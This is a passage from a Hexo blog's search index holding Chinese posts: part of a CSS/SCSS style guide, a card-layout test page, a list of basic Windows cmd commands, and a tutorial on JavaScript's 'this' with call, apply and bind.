  font-size: 1.2rem;
}
</code></pre>
<hr />
<h3 id="缩写属性"><a class="markdownIt-Anchor" href="#缩写属性"></a> 缩写属性</h3>
<p>CSS提供了各种缩写属性（如 font 字体）应该尽可能使用，即使在只设置一个值的情况下。</p>
<p>使用缩写属性对于代码效率和可读性是有很有用的。</p>
<p><strong>不推荐</strong></p>
<pre><code>border-top-style: none;
font-family: palatino, georgia, serif;
font-size: 100%;
line-height: 1.6;
padding-bottom: 2em;
padding-left: 1em;
padding-right: 1em;
padding-top: 0;
</code></pre>
<p><strong>推荐</strong></p>
<pre><code>border-top: 0;
font: 100%/1.6 palatino, georgia, serif;
padding: 0 1em 2em;
</code></pre>
<hr />
<h3 id="0-和-单位"><a class="markdownIt-Anchor" href="#0-和-单位"></a> 0 和 单位</h3>
<p>省略&quot;0&quot;值后面的单位。不要在0值后面使用单位，除非有值。</p>
<p><strong>不推荐</strong></p>
<pre><code>padding-bottom: 0px;
margin: 0em;
</code></pre>
<p><strong>推荐</strong></p>
<pre><code>padding-bottom: 0;
margin: 0;
</code></pre>
<hr />
<h3 id="十六进制表示法"><a class="markdownIt-Anchor" href="#十六进制表示法"></a> 十六进制表示法</h3>
<p>在可能的情况下，使用3个字符的十六进制表示法。<br />
颜色值允许这样表示，<br />
3个字符的十六进制表示法更简短。</p>
<p>始终使用小写的十六进制数字。</p>
<p><strong>不推荐</strong></p>
<pre><code>color: #FF33AA;
</code></pre>
<p><strong>推荐</strong></p>
<pre><code>color: #f3a;
</code></pre>
<hr />
<h3 id="id-和-class类-名的分隔符"><a class="markdownIt-Anchor" href="#id-和-class类-名的分隔符"></a> ID 和 Class（类） 名的分隔符</h3>
<p>使用连字符（中划线）分隔ID和Class（类）名中的单词。为了增强课理解性，在选择器中不要使用除了连字符（中划线）以为的任何字符（包括没有）来连接单词和缩写。</p>
<p>另外，作为该标准，预设属性选择器能识别连字符（中划线）作为单词[<code>attribute|=value]</code>的分隔符，<br />
所以最好的坚持使用连字符作为分隔符。</p>
<p><strong>不推荐</strong></p>
<pre><code>.demoimage {}
.error_status {}
</code></pre>
<p><strong>推荐</strong></p>
<pre><code>#video-id {}
.ads-sample {}
</code></pre>
<hr />
<h3 id="hacks"><a class="markdownIt-Anchor" href="#hacks"></a> Hacks</h3>
<p>避免用户代理检测以及CSS&quot;hacks&quot; – 首先尝试不同的方法。通过用户代理检测或特殊的CSS滤镜，变通的方法和 hacks 很容易解决样式差异。为了达到并保持一个有效的和可管理的代码库，这两种方法都应该被认为是最后的手段。换句话说，从长远来看，用户代理检测和hacks<br />
会伤害项目，作为项目往往应该采取阻力最小的途径。也就是说，轻易允许使用用户代理检测和hacks 以后将过于频繁。</p>
<hr />
<h3 id="声明顺序"><a class="markdownIt-Anchor" href="#声明顺序"></a> 声明顺序</h3>
<p>这是一个选择器内书写CSS属性顺序的大致轮廓。这是为了保证更好的可读性和可扫描重要。</p>
<p>作为最佳实践，我们应该遵循以下顺序（应该按照下表的顺序）：</p>
<ol>
<li>结构性属性：
<ol>
<li>display</li>
<li>position, left, top, right etc.</li>
<li>overflow, float, clear etc.</li>
<li>margin, padding</li>
</ol>
</li>
<li>表现性属性：
<ol>
<li>background, border etc.</li>
<li>font, text</li>
</ol>
</li>
</ol>
<p><strong>不推荐</strong></p>
<pre><code>.box {
  font-family: 'Arial', sans-serif;
  border: 3px solid #ddd;
  left: 30%;
  position: absolute;
  text-transform: uppercase;
  background-color: #eee;
  right: 30%;
  isplay: block;
  font-size: 1.5rem;
  overflow: hidden;
  padding: 1em;
  margin: 1em;
}
</code></pre>
<p><strong>推荐</strong></p>
<pre><code>.box {
  display: block;
  position: absolute;
  left: 30%;
  right: 30%;
  overflow: hidden;
  margin: 1em;
  padding: 1em;
  background-color: #eee;
  border: 3px solid #ddd;
  font-family: 'Arial', sans-serif;
  font-size: 1.5rem;
  text-transform: uppercase;
}
</code></pre>
<hr />
<h3 id="声明结束"><a class="markdownIt-Anchor" href="#声明结束"></a> 声明结束</h3>
<p>为了保证一致性和可扩展性，每个声明应该用分号结束，每个声明换行。</p>
<p><strong>不推荐</strong></p>
<pre><code>.test {
  display: block; height: 100px
}
</code></pre>
<p><strong>推荐</strong></p>
<pre><code>.test {
  display: block;
  height: 100px;
}
</code></pre>
<hr />
<h3 id="属性名结束"><a class="markdownIt-Anchor" href="#属性名结束"></a> 属性名结束</h3>
<p>属性名的冒号后使用一个空格。出于一致性的原因，<br />
属性和值（但属性和冒号之间没有空格）的之间始终使用一个空格。</p>
<p><strong>不推荐</strong></p>
<pre><code>h3 {
  font-weight:bold;
}
</code></pre>
<p><strong>推荐</strong></p>
<pre><code>h3 {
  font-weight: bold;
}
</code></pre>
<hr />
<h3 id="选择器和声明分离"><a class="markdownIt-Anchor" href="#选择器和声明分离"></a> 选择器和声明分离</h3>
<p>每个选择器和属性声明总是使用新的一行。</p>
<p><strong>不推荐</strong></p>
<pre><code>a:focus, a:active {
  position: relative; top: 1px;
}
</code></pre>
<p><strong>推荐</strong></p>
<pre><code>h1,
h2,
h3 {
  font-weight: normal;
  line-height: 1.2;
}
</code></pre>
<hr />
<h3 id="规则分隔"><a class="markdownIt-Anchor" href="#规则分隔"></a> 规则分隔</h3>
<p>规则之间始终有一个空行（双换行符）分隔。</p>
<p><strong>推荐</strong></p>
<pre><code>html {
  background: #fff;
}

body {
  margin: auto;
  width: 50%;
}
</code></pre>
<hr />
<h3 id="css引号"><a class="markdownIt-Anchor" href="#css引号"></a> CSS引号</h3>
<p>属性选择器或属性值用双引号（&quot;&quot;），而不是单引号（&quot;）括起来。<br />
URI值（url()）不要使用引号。</p>
<p><strong>不推荐</strong></p>
<pre><code>@import url('//cdn.com/foundation.css');

html {
  font-family: 'open sans', arial, sans-serif;
}

body:after {
  content: 'pause';
}
</code></pre>
<p><strong>推荐</strong></p>
<pre><code>@import url(//cdn.com/foundation.css);

html {
  font-family: &quot;open sans&quot;, arial, sans-serif;
}

body:after {
  content: &quot;pause&quot;;
}
</code></pre>
<hr />
<h3 id="选择器嵌套-scss"><a class="markdownIt-Anchor" href="#选择器嵌套-scss"></a> 选择器嵌套 (SCSS)</h3>
<p>在Sass中你可以嵌套选择器，这可以使代码变得更清洁和可读。嵌套所有的选择器，但尽量避免嵌套没有任何内容的选择器。<br />
如果你需要指定一些子元素的样式属性，而父元素将不什么样式属性，<br />
可以使用常规的CSS选择器链。<br />
这将防止您的脚本看起来过于复杂。</p>
<p><strong>不推荐</strong></p>
<pre><code>// Not a good example by not making use of nesting at all
.content {
  display: block;
}

.content &gt; .news-article &gt; .title {
  font-size: 1.2em;
}
</code></pre>
<p><strong>不推荐</strong></p>
<pre><code>// Using nesting is better but not in all cases
// Avoid nesting when there is no attributes and use selector chains instead
.content {
  display: block;

  &gt; .news-article {
    &gt; .title {
      font-size: 1.2em;
    }
  }
}
</code></pre>
<p><strong>推荐</strong></p>
<pre><code>// This example takes the best approach while nesting but use selector chains where possible
.content {
  display: block;

  &gt; .news-article &gt; .title {
    font-size: 1.2em;
  }
}
</code></pre>
<hr />
<h3 id="嵌套中引入-空行-scss"><a class="markdownIt-Anchor" href="#嵌套中引入-空行-scss"></a> 嵌套中引入 空行 (SCSS)</h3>
<p>嵌套选择器和CSS属性之间空一行。</p>
<p><strong>不推荐</strong></p>
<pre><code>.content {
  display: block;
  &gt; .news-article {
    background-color: #eee;
    &gt; .title {
      font-size: 1.2em;
    }
    &gt; .article-footnote {
      font-size: 0.8em;
    }
  }
}
</code></pre>
<p><strong>推荐</strong></p>
<pre><code>.content {
  display: block;

  &gt; .news-article {
    background-color: #eee;

    &gt; .title {
      font-size: 1.2em;
    }

    &gt; .article-footnote {
      font-size: 0.8em;
    }
  }
}
</code></pre>
<hr />
<h3 id="上下文媒体查询scss"><a class="markdownIt-Anchor" href="#上下文媒体查询scss"></a> 上下文媒体查询(SCSS)</h3>
<p>在Sass中，当你嵌套你的选择器时也可以使用上下文媒体查询。<br />
在Sass中，你可以在任何给定的嵌套层次中使用媒体查询。<br />
由此生成的CSS将被转换，这样的媒体查询将包裹选择器的形式呈现。</p>
<p>这技术非常方便，<br />
有助于保持媒体查询属于的上下文。</p>
<p>第一种方法这可以让你先写你的手机样式，然后在任何你需要的地方<br />
用上下文媒体查询以提供桌面样式。</p>
<p><strong>不推荐</strong></p>
<pre><code>// This mobile first example looks like plain CSS where the whole structure of SCSS is repeated
// on the bottom in a media query. This is error prone and makes maintenance harder as it's not so easy to relate
// the content in the media query to the content in the upper part (mobile style)

.content-page {
  font-size: 1.2rem;

  &gt; .main {
    background-color: whitesmoke;

    &gt; .latest-news {
      padding: 1rem;

      &gt; .news-article {
        padding: 1rem;

        &gt; .title {
          font-size: 2rem;
        }
      }
    }

    &gt; .content {
      margin-top: 2rem;
      padding: 1rem;
    }
  }

  &gt; .page-footer {
    margin-top: 2rem;
    font-size: 1rem;
  }
}

@media screen and (min-width: 641px) {
  .content-page {
    font-size: 1rem;

    &gt; .main &gt; .latest-news &gt; .news-article &gt; .title {
      font-size: 3rem;
    }

    &gt; .page-footer {
      font-size: 0.8rem;
    }
  }
}
</code></pre>
<p><strong>推荐</strong></p>
<pre><code>// This is the same example as above but here we use contextual media queries in order to put the different styles
// for different media into the right context.

.content-page {
  font-size: 1.2rem;

  @media screen and (min-width: 641px) {
    font-size: 1rem;
  }

  &gt; .main {
    background-color: whitesmoke;

    &gt; .latest-news {
      padding: 1rem;

      &gt; .news-article {
        padding: 1rem;

        &gt; .title {
          font-size: 2rem;

          @media screen and (min-width: 641px) {
            font-size: 3rem;
          }
        }
      }
    }

    &gt; .content {
      margin-top: 2rem;
      padding: 1rem;
    }
  }

  &gt; .page-footer {
    margin-top: 2rem;
    font-size: 1rem;

    @media screen and (min-width: 641px) {
      font-size: 0.8rem;
    }
  }
}
</code></pre>
<hr />
<h3 id="嵌套顺序和父级选择器scss"><a class="markdownIt-Anchor" href="#嵌套顺序和父级选择器scss"></a> 嵌套顺序和父级选择器(SCSS)</h3>
<p>当使用Sass的嵌套功能的时候，<br />
重要的是有一个明确的嵌套顺序，<br />
以下内容是一个SCSS块应具有的顺序。</p>
<ol>
<li>当前选择器的样式属性</li>
<li>父级选择器的伪类选择器 (:first-letter, :hover, :active etc)</li>
<li>伪类元素 (:before and :after)</li>
<li>父级选择器的声明样式 (.selected, .active, .enlarged etc.)</li>
<li>用Sass的上下文媒体查询</li>
<li>子选择器作为最后的部分</li>
</ol>
<p>The following example should illustrate how this ordering will achieve a clear structure while making use of the Sass parent selector.</p>
<p><strong>Recommended</strong></p>
<pre><code>.product-teaser {
  // 1. Style attributes
  display: inline-block;
  padding: 1rem;
  background-color: whitesmoke;
  color: grey;

  // 2. Pseudo selectors with parent selector
  &amp;:hover {
    color: black;
  }

  // 3. Pseudo elements with parent selector
  &amp;:before {
    content: &quot;&quot;;
    display: block;
    border-top: 1px solid grey;
  }

  &amp;:after {
    content: &quot;&quot;;
    display: block;
    border-top: 1px solid grey;
  }

  // 4. State classes with parent selector
  &amp;.active {
    background-color: pink;
    color: red;

    // 4.2. Pseuso selector in state class selector
    &amp;:hover {
      color: darkred;
    }
  }

  // 5. Contextual media queries
  @media screen and (max-width: 640px) {
    display: block;
    font-size: 2em;
  }

  // 6. Sub selectors
  &gt; .content &gt; .title {
    font-size: 1.2em;

    // 6.5. Contextual media queries in sub selector
    @media screen and (max-width: 640px) {
      letter-spacing: 0.2em;
      text-transform: uppercase;
    }
  }
}
</code></pre>
<hr />
<h2 id="系列文章"><a class="markdownIt-Anchor" href="#系列文章"></a> 系列文章</h2>
]]></content>
      <categories>
        <category>前端编码规范</category>
        <category>Front-End&quot;</category>
        <category>搬运整理</category>
      </categories>
      <tags>
        <tag>css</tag>
        <tag>编码规范</tag>
      </tags>
  </entry>
  <entry>
    <title>卡片</title>
    <url>/hexolog/post/7edad275.html</url>
    <content><![CDATA[<blockquote>
<p>该站<code>https://bbs.qn.img-space.com/</code>图片无法在其他站正常加载显示或单击右键跳转单独打开；只能复制链接单独在浏览器窗口打开。同时，打开后，浏览器有了缓存，又可以在其他站加载显示了。</p>
<ul>
<li>该网站<code>bbs.qn.img-space.com</code>对内部资源设置了怎样的加密？是否与跨域相关？</li>
</ul>
</blockquote>
<style>
	.post-content {
		display: flex;
		flex-wrap: wrap;
	}
	.flex-li {
		flex-grow: 1;
		margin: 2px;
	}


.card {
    width:300px;
    margin:0px auto;
    background-color:white;
    box-shadow:0px 5px 20px #999;
    border-radius: 6px;
}
.card a {
    color:#333;
    text-decoration:none;
}
.card:hover .card-image img {
    width:160%;
    filter:grayscale(0);
}

.card-image {
    height:200px;
    position:relative;
    overflow:hidden;
}
.card-image img {
    width:150%;
    position:absolute;
    top:50%;
    left:50%;
    transform:translate(-50%, -50%);
    filter:grayscale(1);
    transition-property:filter width;
    transition-duration:.3s;
    transition-timing-function:ease;
}

.card-body {
    text-align:center;
    padding: 15px 20px;
    box-sizing: border-box;
}

.card-date {
    font-family: 'Source Sans Pro', sans-serif;
}
.card-title, .card-excerpt {
    font-family: 'Playfair Display', serif;
}
.card-date, .card-title {
    text-align:center;
    text-transform:uppercase;
    font-weight: bold;
}
.card-date, .card-excerpt {
    color: #777;
}

</style>
<div class="post-content">
	<div class="flex-li"><img src="https://bbs.qn.img-space.com/201803/4/afcf4c8b2977a065521b36a795b14b92.jpg?imageView2/2/w/1080/q/90/ignore-error/1/" alt="picture" width="160px"></div>
    <div class="flex-li"><img src="https://bbs.qn.img-space.com/201803/4/afcf4c8b2977a065521b36a795b14b92.jpg" alt="picture" width="160px"></div>
	<div class="flex-li"><img src="https://bbs.qn.img-space.com/201803/4/780839183e4ca4d65d2ab62a20226a88.jpg?imageView2/2/w/1080/q/90/ignore-error/1/" alt="picture" width="160px"></div>
	<div class="flex-li"><img src="https://bbs.qn.img-space.com/201803/4/36d9f6b18e859b7d604464b40bf6e134.jpg?imageView2/2/w/1080/q/90/ignore-error/1/" alt="picture" width="160px"></div>
</div>
<div class="post-content">
    <div class="card flex-li">
        <a href="#">
            <div class="card-image">
                <img src="http://www.loveo.cc/wp-content/uploads/2017/02/card-image.jpg"
                alt="Orange" />
            </div>
            <div class="card-body">
                <div class="card-date">
                    <time>
                        20 Novembre 1992
                    </time>
                </div>
                <div class="card-title">
                    <h3>
                        Lorem Ipsum
                    </h3>
                </div>
                <div class="card-exceprt">
                    <p>
                        Lorem ipsum dolor sit amet, consectetur adipisicing elit. Aliquam voluptatibus
                        autem consectetur voluptate facere at, omnis ab optio placeat officiis!
                        Animi modi harum enim quia veniam consectetur unde autem inventore.
                    </p>
                </div>
            </div>
        </a>
    </div>
    <div class="card flex-li">
        <a href="#">
            <div class="card-image">
                <img src="http://www.loveo.cc/wp-content/uploads/2017/02/card-image.jpg"
                alt="Orange" />
            </div>
            <div class="card-body">
                <div class="card-date">
                    <time>
                        20 Novembre 1992
                    </time>
                </div>
                <div class="card-title">
                    <h3>
                        Lorem Ipsum
                    </h3>
                </div>
                <div class="card-exceprt">
                    <p>
                        Lorem ipsum dolor sit amet, consectetur adipisicing elit. Aliquam voluptatibus
                        autem consectetur voluptate facere at, omnis ab optio placeat officiis!
                        Animi modi harum enim quia veniam consectetur unde autem inventore.
                    </p>
                </div>
            </div>
        </a>
    </div>
</div>
]]></content>
      <categories>
        <category>探究测试</category>
      </categories>
      <tags>
        <tag>markdown-html</tag>
      </tags>
  </entry>
  <entry>
    <title>常用 cmd 命令（遇到的）</title>
    <url>/hexolog/post/20990.html</url>
    <content><![CDATA[<h2 id="常用-cmd-命令"><a class="markdownIt-Anchor" href="#常用-cmd-命令"></a> 常用 cmd 命令</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1. 进入 cmd 命令窗口：快捷键 Win+R,输入 “cmd” ，点击“运行”即可。</span><br><span class="line">2. <span class="built_in">cd</span>..                   				   <span class="comment"># 返回上一级文件夹</span></span><br><span class="line">3. <span class="built_in">cd</span> [文件夹名]          				   <span class="comment"># 进入下一级文件夹</span></span><br><span class="line">4. d:                     				   <span class="comment"># 进入另一个磁盘（如：D盘）根目录</span></span><br><span class="line">5. <span class="built_in">cd</span> [文件夹路径]        				   <span class="comment"># 进入任一文件夹</span></span><br><span class="line">6. dir                   				   <span class="comment"># 查看当前路径文件夹内容</span></span><br><span class="line">7. mkdir [文件夹名]       				   <span class="comment"># 创建文件夹</span></span><br><span class="line">8. start D:\Github\Hugo\bin\hugo.exe       <span class="comment"># 如何在cmd中打开D:\Github\Hugo\bin\hugo.exe</span></span><br><span class="line">9. cls 或者 clear         				   <span class="comment"># cmd清屏</span></span><br></pre></td></tr></table></figure>
<h2 id="在-sublime-编辑器中运行-cmd"><a class="markdownIt-Anchor" href="#在-sublime-编辑器中运行-cmd"></a> 在 sublime 编辑器中运行 cmd</h2>
<p>这里需要用到<a href="https://packagecontrol.io/packages/SublimeREPL" target="_blank" rel="noopener">SublimeREPL插件</a>.</p>
<ol>
<li>给sublime text2/3安装SublimeREPL插件；</li>
<li>重启sublime text2/3；</li>
<li>按组合键 <kbd>Ctrl</kbd>+<kbd>Shift</kbd>+<kbd>P</kbd>， 然后输入sublimerepl:shell，选中它单击即可调出cmd命令。</li>
</ol>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>cmd</tag>
        <tag>sublime text</tag>
      </tags>
  </entry>
  <entry>
    <title>正确认识 JavaScript 中的 this</title>
    <url>/hexolog/post/3a977c25.html</url>
    <content><![CDATA[<blockquote>
<p>原创，转载请注明出处。</p>
</blockquote>
<h2 id="this-的定义"><a class="markdownIt-Anchor" href="#this-的定义"></a> <code>this</code> 的定义</h2>
<p>要正确了解 <code>this</code> ，还得先从其定义入手：</p>
<ol>
<li><code>this</code> 是函数内部的两个特殊对象之一（另一个为 <code>arguments</code>）；</li>
<li><code>this</code> 引用的是其所属函数被执行时的环境对象（说白了就是<strong>this所属函数的父级对象</strong>）</li>
<li>由于在调用函数之前，其父级对象是不确定的，因此 <code>this</code> 也是不确定的，可能会在代码执行过程中引用不同的对象。</li>
</ol>
<blockquote>
<p>似乎没有 <code>所属函数</code>和<code>父级对象</code> 这两词，只不过我觉得用这两词来描述可能会更容易正确的理解一些。因为《JavaScript 高级程序设计》（中文版）中，后两点确实不太好理解，一个 <code>this对象</code>，一个 <code>this值</code>，以至于我之前一直将其错误地理解成所属函数的引用。</p>
</blockquote>
<a id="more"></a>
<h2 id="案列分析"><a class="markdownIt-Anchor" href="#案列分析"></a> 案列分析</h2>
<p>下面再来分析一下，当函数在不同作用域下被调用时，其 <code>this</code> 对象所引用的对象。</p>
<h3 id="一般情况"><a class="markdownIt-Anchor" href="#一般情况"></a> 一般情况</h3>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> color = <span class="string">'red'</span>;</span><br><span class="line"><span class="keyword">var</span> o =&#123;<span class="attr">color</span>:<span class="string">'blue'</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sayColor</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="keyword">this</span>.color)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fN</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> color = <span class="string">'pink'</span>;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="keyword">this</span>.color)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">window</span>.color);        <span class="comment">// "red"</span></span><br><span class="line">sayColor();                       <span class="comment">// "red"  （此处，sayColor是在全局作用域下调用的。sayColor()与window.sayColor()是一样的。）</span></span><br><span class="line">fN();                             <span class="comment">// "red"   (看你有没有正真理解第二点😂)</span></span><br></pre></td></tr></table></figure>
<h3 id="引入apply和call的情况"><a class="markdownIt-Anchor" href="#引入apply和call的情况"></a> 引入<code>.apply()</code>和<code>.call()</code>的情况</h3>
<p>引入<code>.apply()</code>和<code>.call()</code>可以扩充函数赖以运行的作用域。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> color = <span class="string">'red'</span>;</span><br><span class="line"><span class="keyword">var</span> o =&#123;<span class="attr">color</span>:<span class="string">'blue'</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sayColor</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="keyword">this</span>.color)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">sayColor.call(<span class="keyword">this</span>);              <span class="comment">// "red"</span></span><br><span class="line">sayColor.call(<span class="built_in">window</span>);            <span class="comment">// "red"</span></span><br><span class="line">sayColor.call(<span class="literal">null</span>);              <span class="comment">// "red"  (此时sayColor的this指向window)</span></span><br><span class="line">sayColor.call(o);                 <span class="comment">// "blue"  (此时sayColor的this指向对象o)</span></span><br><span class="line"></span><br><span class="line">sayColor.apply(<span class="keyword">this</span>);              <span class="comment">// "red"</span></span><br><span class="line">sayColor.apply(<span class="built_in">window</span>);            <span class="comment">// "red"</span></span><br><span class="line">sayColor.apply(<span class="literal">null</span>);              <span class="comment">// "red" (此时sayColor的this指向window)</span></span><br><span class="line">sayColor.apply(o);                 <span class="comment">// "blue"</span></span><br><span class="line"></span><br><span class="line">o.sayColor();                     <span class="comment">// TypeError: o.sayColor is not a function</span></span><br></pre></td></tr></table></figure>
<h3 id="引入bind的情况"><a class="markdownIt-Anchor" href="#引入bind的情况"></a> 引入<code>.bind()</code>的情况</h3>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> color = <span class="string">'red'</span>;</span><br><span class="line"><span class="keyword">var</span> o =&#123;<span class="attr">color</span>:<span class="string">'blue'</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sayColor</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="keyword">this</span>.color)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">sayColor.bind(o);                        <span class="comment">// 函数调用.bind()方法只是创建一个该函数的实例，并不会立即执行</span></span><br><span class="line">sayColor.bind(o)();                      <span class="comment">// "blue"  （此时，sayColor函数的this指向对象o）</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> objectSayColor = sayColor.bind(o);</span><br><span class="line">objectSayColor();                        <span class="comment">// "blue"   （此时，sayColor函数的this指向对象o）</span></span><br></pre></td></tr></table></figure>
<h3 id="bind与apply和call的区别"><a class="markdownIt-Anchor" href="#bind与apply和call的区别"></a> bind与apply和call的区别</h3>
<blockquote>
<p><code>.apply()</code>和<code>.call()</code>、<code>.bind()</code> 是函数的三个固有方法。前两者非继承而来的，是用来调用函数的；而后者是ES5中定义的，用来创建函数实例的。</p>
</blockquote>
<ul>
<li><code>.apply()</code>和<code>.call()</code>都是改变<code>该方法所属函数</code>中的<code>this</code>,并立即执行这个函数；</li>
<li><code>.bind()</code>可以改变<code>该方法所属函数</code>中的<code>this</code>，不过它只是创建一个该函数的实例，并不会立即执行，也因此你可以让对应的函数想什么时候调就什么时候调用，并且可以将参数在执行的时候添加。</li>
</ul>
<p>鉴于以上区别，我们可以根据实际情况来选择使用。</p>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
      </tags>
  </entry>
</search>
